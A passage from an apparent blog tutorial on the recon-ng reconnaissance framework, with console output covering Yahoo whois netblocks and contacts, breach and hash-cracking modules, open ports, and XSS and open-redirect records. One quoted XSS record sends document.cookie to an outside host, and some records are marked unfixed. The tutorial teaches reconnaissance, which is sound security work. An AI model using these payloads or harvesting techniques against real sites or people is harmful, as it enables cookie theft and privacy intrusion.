[*] URL: <a href="http://whois.arin.net/rest/orgs;name=yahoo">http://whois.arin.net/rest/orgs;name=yahoo</a></p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 701 First Avenue, Sunnyvale, CA 94089
[</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/nets">http://whois.arin.net/rest/org/YAHOO-1/nets</a>
[<em>] Netblock: 8.3.34.0/23
[</em>] Netblock: 216.34.77.0/25
[<em>] Netblock: 8.8.178.0/24
[</em>] Netblock: 64.209.232.0/24
[<em>] Netblock: 64.39.38.208/28
[</em>] Netblock: 204.71.177.0/24
[<em>] Netblock: 204.71.188.0/24
[</em>] Netblock: 216.136.220.128/25
[<em>] Netblock: 64.56.197.208/28
[</em>] Netblock: 67.72.118.0/23
[<em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/pocs">http://whois.arin.net/rest/org/YAHOO-1/pocs</a>
[</em>] Contact: Netblock Admin (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x6e;&#101;&#116;&#98;&#x6c;&#111;&#x63;&#x6b;&#97;&#100;&#109;&#x69;&#x6e;&#64;&#121;&#x61;&#104;&#111;&#x6f;&#45;&#105;&#110;&#99;&#x2e;&#99;&#x6f;&#x6d;">&#110;&#x65;&#116;&#98;&#108;&#111;&#x63;&#107;&#x61;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x79;&#97;&#x68;&#x6f;&#111;&#45;&#x69;&#x6e;&#x63;&#x2e;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
[<em>] Contact: Netblock Admin (<a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6e;&#x65;&#116;&#98;&#x6c;&#x6f;&#x63;&#x6b;&#97;&#x64;&#109;&#x69;&#x6e;&#x40;&#121;&#97;&#104;&#x6f;&#x6f;&#x2d;&#105;&#110;&#x63;&#x2e;&#99;&#111;&#x6d;">&#x6e;&#101;&#116;&#98;&#x6c;&#x6f;&#99;&#x6b;&#97;&#100;&#x6d;&#x69;&#110;&#64;&#121;&#x61;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#110;&#99;&#x2e;&#99;&#111;&#109;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
[</em>] Contact: Network Abuse (<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#97;&#98;&#x75;&#115;&#101;&#x40;&#121;&#x61;&#x68;&#111;&#x6f;&#x2d;&#x69;&#110;&#99;&#46;&#99;&#111;&#109;">&#97;&#x62;&#117;&#x73;&#x65;&#x40;&#x79;&#97;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#x6e;&#99;&#x2e;&#x63;&#111;&#109;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 325 Geri St, Lawrenceburg, TN 38464
[</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/nets">http://whois.arin.net/rest/org/YAHOO-10/nets</a>
[<em>] Netblock: 12.23.247.176/29
[</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/pocs">http://whois.arin.net/rest/org/YAHOO-10/pocs</a>
[<em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#106;&#107;&#105;&#108;&#x62;&#117;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#x70;&#64;&#121;&#97;&#104;&#x6f;&#x6f;&#46;&#99;&#x6f;&#109;">&#106;&#x6b;&#x69;&#x6c;&#x62;&#x75;&#x72;&#x6e;&#49;&#x73;&#x74;&#111;&#112;&#x40;&#121;&#97;&#x68;&#x6f;&#x6f;&#46;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
[</em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#106;&#107;&#105;&#108;&#x62;&#x75;&#x72;&#110;&#49;&#x73;&#x74;&#x6f;&#112;&#64;&#121;&#97;&#104;&#x6f;&#x6f;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#x6b;&#105;&#108;&#98;&#117;&#114;&#x6e;&#49;&#115;&#x74;&#111;&#x70;&#64;&#121;&#x61;&#104;&#x6f;&#111;&#x2e;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#106;&#107;&#105;&#108;&#98;&#x75;&#114;&#110;&#49;&#115;&#116;&#x6f;&#x70;&#x40;&#x79;&#x61;&#104;&#x6f;&#111;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#x6b;&#105;&#108;&#98;&#x75;&#x72;&#x6e;&#x31;&#x73;&#116;&#x6f;&#x70;&#x40;&#x79;&#97;&#x68;&#111;&#111;&#46;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
[</em>] URL: <a href="http://whois.arin.net/rest/customers;name=yahoo">http://whois.arin.net/rest/customers;name=yahoo</a></p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 225 Broadway, San Diego, CA 92101
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146168/nets">http://whois.arin.net/rest/customer/C00146168/nets</a>
[<em>] Netblock: 209.132.98.0/29
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146168/pocs">http://whois.arin.net/rest/customer/C00146168/pocs</a>
[*] No POCS found.</p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 225 Broadway, San Diego, CA 92101
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146169/nets">http://whois.arin.net/rest/customer/C00146169/nets</a>
[<em>] Netblock: 209.132.98.8/29
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C00146169/pocs">http://whois.arin.net/rest/customer/C00146169/pocs</a>
[*] No POCS found.</p>

<hr />

<h2>YAHOO</h2>

<p>[<em>] Location: 624 S Grand, Los Angeles, CA 90017
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C01196389/nets">http://whois.arin.net/rest/customer/C01196389/nets</a>
[<em>] Netblock: 65.91.7.80/29
[</em>] URL: <a href="http://whois.arin.net/rest/customer/C01196389/pocs">http://whois.arin.net/rest/customer/C01196389/pocs</a>
[*] No POCS found.</p>

<hr />

<h2>SUMMARY</h2>

<p>[<em>] 5 total (2 new) companies found.
[</em>] 5 total (4 new) locations found.
[<em>] 14 total (14 new) netblocks found.
[</em>] 6 total (6 new) contacts found.
```</p>

<ul>
<li><p>Bing Linkedin Profile Harvester &ndash; Harvests contacts from linkedin.com by querying Bing for Linkedin pages related to the given
companies, parsing the profiles, and adding them to the &lsquo;profiles&rsquo; table</p></li>
<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Have I been pwned? Paste Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses have been published to various
paste sites. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>PwnedList Validator &ndash; Leverages PwnedList.com to determine if email addresses are associated with leaked credentials. Adds
compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Contacts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames associated with email addresses stored in the &lsquo;contacts&rsquo;
table.</p></li>
<li><p>FullContact Contact Enumerator &ndash; Harvests contact information and profiles from the fullcontact.com API using email addresses as
input. Updates the &lsquo;contacts&rsquo; and &lsquo;profiles&rsquo; tables with the results.</p></li>
<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
the level of success.</p></li>
<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;
table with the positive results.</p></li>
<li><p>Hashes.org Hash Lookup &ndash; Uses the Hashes.org API to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with the
positive results.</p></li>
<li><p>leakdb Hash Lookup &ndash; Uses the leakdb hash database to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with
the positive results.</p></li>
<li><p>PGP Key Owner Lookup &ndash; Searches the MIT public PGP key server for email addresses of the given domain. Updates the
&lsquo;contacts&rsquo; table with the results</p></li>
</ul>


<p>This module is similar to <a href="recon/domains-contacts/salesmaple">theHarvester</a></p>

<ul>
<li><p>SalesMaple Contact Harvester &ndash; Harvests contacts from the SalesMaple API using domains as input. Updates the &lsquo;contacts&rsquo; table with
the results.</p></li>
<li><p>Whois POC Harvester &ndash; Uses the ARIN Whois RWS to harvest POC data from whois queries for the given domain. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; Account Credentials Fetcher &ndash; Queries the PwnedList API for credentials associated with the given usernames. Updates the
&lsquo;credentials&rsquo; table with the results.</p></li>
<li><p>PwnedList &ndash; API Usage Statistics Fetcher &ndash; Queries the PwnedList API for account usage statistics</p></li>
<li><p>PwnedList &ndash; Pwned Domain Credentials Fetcher &ndash; Queries the PwnedList API to fetch all credentials for a domain. Updates the &lsquo;credentials&rsquo; table
with the results</p></li>
<li><p>PwnedList &ndash; Pwned Domain Statistics Fetcher &ndash; Queries the PwnedList API for a domain to determine if any associated credentials have been
compromised. This module does NOT return any credentials, only a total number of compromised
credentials.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leak_lookup.py) &ndash; Queries the local database for information associated with a leak ID. The &lsquo;leaks_dump&rsquo; module must
be used to populate the local database before this module will execute successfully.</p></li>
<li><p>PwnedList &ndash; Leak Details Fetcher (leaks_dump.py) &ndash; Queries the PwnedList API for information associated with all known leaks. Updates the &lsquo;leaks&rsquo; table with the results.</p></li>
<li><p>DNS Public Suffix Brute Forcer &ndash; Brute forces TLDs and SLDs using DNS. Updates the &lsquo;domains&rsquo; table with the results</p></li>
<li><p>Baidu Hostname Enumerator &ndash; Harvests hosts from Baidu.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Bing API Hostname Enumerator &ndash; Leverages the Bing API and &ldquo;domain:&rdquo; advanced search operator to harvest hosts. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>Bing Hostname Enumerator &ndash; Harvests hosts from Bing.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>DNS Hostname Brute Forcer &ndash; Brute forces host names using DNS. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>BuiltWith Enumerator &ndash; Leverages the BuiltWith API to identify hosts, technologies, and contacts associated with a domain</p></li>
<li><p>Google CSE Hostname Enumerator &ndash; Leverages the Google Custom Search Engine API to harvest hosts using the &lsquo;site&rsquo; search operator.
Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Google Hostname Enumerator &ndash; Harvests hosts from Google.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
<li><p>Netcraft Hostname Enumerator &ndash; Harvests hosts from Netcraft.com. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Shodan Hostname Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;hostname&rsquo; search operator. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>SSL SAN Lookup &ndash; Uses the ssltools.com site to obtain the Subject Alternative Names for a domain. Updates the &lsquo;hosts&rsquo;
table with the results.</p></li>
<li><p>VPNHunter Lookup &ndash; Checks vpnhunter.com for SSL VPNs, remote accesses, email portals and generic login sites. Updates
the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Yahoo Hostname Enumerator &ndash; Harvests hosts from Yahoo.com by using the &lsquo;domain&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
the results.</p></li>
<li><p>PunkSPIDER Vulnerabilty Finder &ndash; Leverages the PunkSPIDER API to search for previosuly discovered vulnerabltiies on hosts within a
domain.</p></li>
<li><p>XSSed Domain Lookup &ndash; Checks XSSed.com for XSS records associated with a domain and displays the first 20 results</p></li>
</ul>


<p>This is a very handy module for XSS lookup. Let&rsquo;s take a look at it:</p>

<p>``` plain
[recon-ng][default][xssed] > run</p>

<hr />

<h2>YAHOO.COM</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20">http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20</a>(docume<br>nt.cookie);document.location%20=%20%22<a href="http://1337hax0rz.com%22">http://1337hax0rz.com%22</a>
[<em>] Host: adz.kr.yahoo.com
[</em>] Publish_Date: 2015-03-10 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/60821/">http://xssed.com/mirror/60821/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript">http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript</a><br>:alert(/412/)
[<em>] Host: us.yimg.vip.scd.yahoo.com
[</em>] Publish_Date: 2012-02-16 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/57596/">http://xssed.com/mirror/57596/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: Script Insertion
[</em>] Example: <a href="http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert">http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert</a>(String.fromCharCode(88%2C83%2C83))%3C%2Fsc<br>ript%3E&amp;sort=relevance
[<em>] Host: fr.groups.yahoo.com
[</em>] Publish_Date: 2011-12-22 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/61982/">http://xssed.com/mirror/61982/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=">http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=</a><script>alert(/XSS-by-[]0iZy5/)&lt;/scri<br>pt>
[<em>] Host: basketball.fantasysports.yahoo.com
[</em>] Publish_Date: 2011-12-21 00:00:00
[*] Reference: <a href="http://xssed.com/mirror/71051/">http://xssed.com/mirror/71051/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[<em>] Category: Redirect
[</em>] Example: <a href="http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO">http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO</a><br>O/EXP=1275539597/L=hnNys0Kjqbp5Cok8Sr10cAJDTPYa3UwHFG0AANhn/B=VSDoPmKJiUs-/J=1275532397077354/K=rS6p<br>wy3MN2NPP7SBqBCOAQ/A=6097785/R=0/SIG=11o4aqdmv/<em><a href="http://xssed.com/newsearch/searchpad.html">http://xssed.com/newsearch/searchpad.html</a>
[</em>] Host: www.yahoo.com
[<em>] Publish_Date: 2011-12-21 00:00:00
[</em>] Reference: <a href="http://xssed.com/mirror/67076/">http://xssed.com/mirror/67076/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[snip]
```</p>

<ul>
<li>XSSposed Domain Lookup &ndash; Checks XSSposed.com for XSS records associated with a domain</li>
</ul>


<p>Another good module for hunting down XSS</p>

<p>``` plain
[recon-ng][default][xssposed] > run</p>

<hr />

<h2>BITDEFENDER.COM</h2>

<p>[<em>] Category: REDIRECT
[</em>] Example: <a href="https://safeweb.norton.com/report/show?url=store.bitdefender.com">https://safeweb.norton.com/report/show?url=store.bitdefender.com</a>
[<em>] Host: store.bitdefender.com
[</em>] Publish_Date: 2016-06-20 21:09:16
[*] Reference: <a href="https://www.openbugbounty.org/incidents/160213/">https://www.openbugbounty.org/incidents/160213/</a></p>

<h2>[*] Status: unfixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert">https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert</a><code>OPENBUGBOUNTY</code>
[<em>] Host: labs.bitdefender.com
[</em>] Publish_Date: 2016-05-17 20:31:25
[*] Reference: <a href="https://www.openbugbounty.org/incidents/154457/">https://www.openbugbounty.org/incidents/154457/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: XSS
[</em>] Example: <a href="https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert">https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert</a><code>OPENBUGBOUNTY</code>
[<em>] Host: rdprojects.bitdefender.com
[</em>] Publish_Date: 2016-05-17 20:32:26
[*] Reference: <a href="https://www.openbugbounty.org/incidents/154458/">https://www.openbugbounty.org/incidents/154458/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: REDIRECT
[</em>] Example: <a href="http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/">http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/</a>
[<em>] Host: bitdefender.com
[</em>] Publish_Date: 2016-01-03 01:53:37
[*] Reference: <a href="https://www.openbugbounty.org/incidents/121291/">https://www.openbugbounty.org/incidents/121291/</a></p>

<h2>[*] Status: fixed</h2>

<p>[<em>] Category: REDIRECT
[</em>] Example: <a href="https://store.bitdefender.com/redirect.php?url=http://xssposed.org/">https://store.bitdefender.com/redirect.php?url=http://xssposed.org/</a>
[<em>] Host: store.bitdefender.com
[</em>] Publish_Date: 2015-09-19 20:33:58
[*] Reference: <a href="https://www.openbugbounty.org/incidents/87399/">https://www.openbugbounty.org/incidents/87399/</a></p>

<h2>[*] Status: fixed</h2>

<hr />

<h2>SUMMARY</h2>

<p>[*] 5 total (5 new) vulnerabilities found.
```</p>

<ul>
<li><p>Hosts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames stored in the &lsquo;hosts&rsquo; table</p></li>
<li><p>Bing API IP Neighbor Enumerator &ndash; Leverages the Bing API and &ldquo;ip:&rdquo; advanced search operator to enumerate other virtual hosts sharing
the same IP address. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>FreeGeoIP &ndash; Leverages the freegeoip.net API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with
the results</p></li>
</ul>


<p>I used this to check the location of www.google.com host (resolved the IP first):</p>

<p><code>plain
[recon-ng][default][freegeoip] &gt; run
[*] 172.217.16.100 - 37.4192,-122.0574 - Mountain View, California, United States
</code></p>

<ul>
<li><p>My-IP-Neighbors.com Lookup &ndash; Checks My-IP-Neighbors.com for virtual hosts on the same server. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>IPInfoDB GeoIP &ndash; Leverages the ipinfodb.com API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with the
results.</p></li>
<li><p>Hostname Resolver &ndash; Resolves the IP address for a host. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each IP address to resolve the hostname. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Address Geocoder &ndash; Queries the Google Maps API to obtain coordinates for an address. Updates the &lsquo;locations&rsquo; table with
the results.</p></li>
</ul>


<p>Let&rsquo;s see this module in action with one of our favorite tech giants' addresses xD (I leave it to you to see what&rsquo;s located there):</p>

<p>``` plain
[recon-ng][default][geocode] > run
[<em>] Geocoding &lsquo;1600 Amphitheatre Parkway&rsquo;&hellip;
[</em>] Latitude: 37.4224713, Longitude: -122.0843333</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 1 total (1 new) locations found.
```</p>

<ul>
<li>Reverse Geocoder &ndash; Queries the Google Maps API to obtain an address from coordinates.</li>
</ul>


<p>So we have some coordinates. Let&rsquo;s see what&rsquo;s there:</p>

<p>``` plain
[recon-ng][default][reverse_geocode] > run
[<em>] Reverse geocoding (35.670337, 139.702573)&hellip;
[</em>] 1 Chome-18-20 Jingūmae, Shibuya-ku, Tōkyō-to 150-0001, Japan</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 1 total (1 new) locations found.
```</p>

<ul>
<li><p>Flickr Geolocation Search &ndash; Searches Flickr for media in the specified proximity to a location.</p></li>
<li><p>Instagram Geolocation Search &ndash; Searches Instagram for media in the specified proximity to a location.</p></li>
<li><p>Picasa Geolocation Search &ndash; Searches Picasa for media in the specified proximity to a location.</p></li>
<li><p>Shodan Geolocation Search &ndash; Searches Shodan for media in the specified proximity to a location.</p></li>
<li><p>Twitter Geolocation Search &ndash; Searches Twitter for media in the specified proximity to a location.</p></li>
<li><p>YouTube Geolocation Search &ndash; Searches YouTube for media in the specified proximity to a location.</p></li>
<li><p>Whois Company Harvester &ndash; Uses the ARIN Whois RWS to harvest Companies data from whois queries for the given netblock. Updates
the &lsquo;companies&rsquo; table with the results.</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each of a netblock&rsquo;s IP addresses to resolve the hostname. Updates the
&lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Shodan Network Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;net&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Internet Census 2012 Lookup &ndash; Queries the Internet Census 2012 data through Exfiltrated.com to enumerate open ports for a
netblock.</p></li>
</ul>


<p>This will come in handy to give you an idea about hosts without directly port scanning them:</p>

<p>``` plain
[recon-ng][default][census_2012] > run</p>

<hr />

<h2>8.3.34.0/23</h2>

<p>[<em>] 8.3.34.0/23 (8.3.34.0 &ndash; 8.3.35.255)
[</em>] 8.3.34.5 (rsw4-1-gci.smpenn.corp.yahoo.com) &ndash; 80
[<em>] 8.3.34.28 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.46 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[<em>] 8.3.34.60 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.66 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[<em>] 8.3.34.79 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.222 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[<em>] 8.3.34.225 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 25
[<em>] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.34.246 (tstsqlclstr1d.smca.yahoo.com) &ndash; 80
[<em>] 8.3.34.255 (UNKNOWN-8-3-34-X.yahoo.com) &ndash; 80
[</em>] 8.3.35.71 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80
[<em>] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 25
[</em>] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80
[<em>] 8.3.35.186 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80
[</em>] 8.3.35.220 (UNKNOWN-8-3-35-X.yahoo.com) &ndash; 80</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 17 total (17 new) ports found.
````</p>

<ul>
<li><p>Ports to Hosts Data Migrator &ndash; Adds a new host for all the hostnames stored in the &lsquo;ports&rsquo; table.</p></li>
<li><p>Dev Diver Repository Activity Examiner &ndash; Searches public code repositories for information about a given username.</p></li>
</ul>


<p>This is another useful module to search for a developer on different platforms (note to self: I have to get back into coding frenzy):</p>

<p>``` plain
[recon-ng][default][dev_diver] > run
[<em>] Checking Github&hellip;
[</em>] Github username found &ndash; (<a href="https://api.github.com/users/chousensha">https://api.github.com/users/chousensha</a>)</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |                               Github                              |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | Resource    | Github                                              |
  | User Name   | chousensha                                          |
  | Profile URL | <a href="https://github.com/chousensha">https://github.com/chousensha</a>                       |
  | Avatar URL  | <a href="https://avatars.githubusercontent.com/u/5703557?v=3">https://avatars.githubusercontent.com/u/5703557?v=3</a> |
  | Location    |                                                     |
  | Company     |                                                     |
  | Blog URL    | <a href="http://chousensha.github.io/">http://chousensha.github.io/</a>                        |
  | Email       |                                                     |
  | Bio         |                                                     |
  | Followers   | 2                                                   |
  | ID          | 5703557                                             |
  | Joined      | 2013-10-16                                          |
  | Updated     | 2016-04-29                                          |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>

<p>[<em>] Checking Bitbucket&hellip;
[</em>] Bitbucket username not found.
[<em>] Checking SourceForge&hellip;
[</em>] Sourceforge username not found.
[<em>] Checking CodePlex&hellip;
[</em>] CodePlex username not found.
[<em>] Checking Gitorious&hellip;
[</em>] Gitorious username not found.</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 1 total (1 new) contacts found.
```</p>

<ul>
<li><p>Linkedin Contact Crawler &ndash; Harvests contact information from linkedin.com by parsing the link(s) given and adding the info to
the &lsquo;contacts&rsquo; table.</p></li>
<li><p>Linkedin Profile Crawler &ndash; Harvests profiles from linkedin.com by visting the given link(s), crawling the &ldquo;Viewers of this
profile also viewed&rdquo;, parsing the pages, and adding new profiles to the &lsquo;profiles&rsquo; table</p></li>
<li><p>NameChk.com Username Validator &ndash; Leverages NameChk.com to validate the existance of usernames on specific web sites and updates the
&lsquo;profiles&rsquo; table with the results.</p></li>
</ul>


<p>Good for recon but also for checking if how unique is your l33t handle:</p>

<p>``` plain
[recon-ng][default][namechk] > run
[*] Retrieving site data&hellip;</p>

<hr />

<h2>CHOUSENSHA</h2>

<p>[<em>] Wordpress: Available.
[</em>] Reddit: Available.
[<em>] Blogger: Available.
[</em>] GooglePlus: Available.
[<em>] Ebay: Available.
[</em>] Twitch: Available.
[<em>] Instagram: Available.
[</em>] Twitter: User exists!
[<em>] Facebook: User exists!
[</em>] Slack: Available.
[<em>] PayPal: Available.
[</em>] Pinterest: Available.
[<em>] Vine: User exists!
[</em>] Github: User exists!
[<em>] Basecamp: Available.
[</em>] Flickr: Available.
[<em>] Pandora: Available.
[</em>] Spotify: Available.
[<em>] YouTube: User exists!
[</em>] MySpace: Available.
[<em>] Steam: Available.
[</em>] Flipboard: Available.
[<em>] OkCupid: Available.
[</em>] UStream: Available.
[<em>] Vimeo: Available.
[</em>] Etsy: User exists!
[<em>] BitBucket: Available.
[</em>] SoundCloud: Available.
[<em>] 500px: Available.
[</em>] CashMe: Available.
[<em>] Meetup: Available.
[</em>] DailyMotion: Available.
[<em>] About.me: User exists!
[</em>] ProductHunt: Available.
[<em>] Disqus: User exists!
[</em>] Medium: User exists!
[<em>] Behance: Available.
[</em>] Imgur: Available.
[<em>] Bit.ly: User exists!
[</em>] Fanpop: Available.
[<em>] Cafe Mom: Available.
[</em>] Instructables: Available.
[<em>] Photobucket: Available.
[</em>] Good Reads: Available.
[<em>] deviantART: Available.
[</em>] Tumblr: Available.
[<em>] Gravatar: Available.
[</em>] Venmo: User exists!
[<em>] Keybase: Available.
[</em>] StumbleUpon: User exists!
[<em>] Kongregate: User exists!
[</em>] LiveJournal: Available.
[<em>] Yelp: User exists!
[</em>] Codecademy: Available.
[<em>] Foursquare: Available.
